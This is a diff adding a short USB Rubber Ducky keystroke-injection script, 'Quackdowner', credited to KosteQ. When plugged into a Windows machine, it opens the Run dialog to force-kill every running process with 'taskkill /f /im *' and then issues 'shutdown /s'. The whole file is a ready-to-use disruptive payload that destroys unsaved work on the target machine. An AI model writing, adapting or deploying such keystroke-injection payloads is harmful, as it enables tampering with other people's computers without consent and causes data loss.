@@ -1,0 +1,16 @@
+REM TITLE: Quackdowner
+REM AUTHOR: KosteQ
+REM DESCRIPTION: Program will termiante all aplications and shutdown the PC
+
+REM *Terminate all applications*
+DELAY 500
+GUI r
+DELAY 200
+STRING taskkill /f /im *
+ENTER
+
+REM *Shutdown computer*
+GUI r
+DELAY 200
+STRING shutdown /s
+ENTER
